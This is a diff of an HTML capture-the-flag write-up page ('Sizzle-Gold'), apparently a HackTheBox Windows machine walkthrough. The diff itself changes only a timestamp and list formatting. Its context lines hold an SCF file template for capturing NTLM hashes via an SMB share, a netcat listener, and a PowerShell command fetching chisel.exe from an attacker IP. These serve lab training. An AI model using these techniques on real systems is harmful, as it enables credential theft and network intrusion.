@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-21T18:21:40 EDT">
+<meta name="revised" content="2019-07-22T21:23:05 EDT">
 <title>Sizzle-Gold :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -750,15 +750,16 @@ for folder in /mnt/sizzle/**/*; do touch &quot;$folder&quot;;done
 
 <ul>
 <li><a href="https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/">https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/</a></li>
-<li><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></li>
-</ul>
+
+<li><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p>
 
 <pre><code>[Shell]
 Command=2
 IconFile=\\CHANGE ME\pie.ico
 [Tashbar]
 Command=ToggleDesktop
-</code></pre>
+</code></pre></li>
+</ul>
 
 <p><strong>Responder</strong></p>
 
@@ -867,8 +868,8 @@ openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt
 
 <ul>
 <li><a href="https://github.com/samratashok/nishang/tree/master/Shells">https://github.com/samratashok/nishang/tree/master/Shells</a></li>
-<li><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li>
-</ul>
+
+<li><p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
 
 <pre><code>python3 -m http.server 80
 nc -lvnp portNUmbers
@@ -878,7 +879,8 @@ nc -lvnp portNUmbers
 </code></pre>
 
 <pre><code>powershell iwr &quot;http://10.10.15.105/chisel.exe&quot; -outfile chisel.exe
-</code></pre>
+</code></pre></li>
+</ul>
 
 <p>Setting up the chisel servers &amp; clients there are handful ways to setup the chisel proxy. The first is overly complex will requirer multiple shells to do. the second is simpler and the last is darn simple. setting up the server is the easiest part.</p>
 
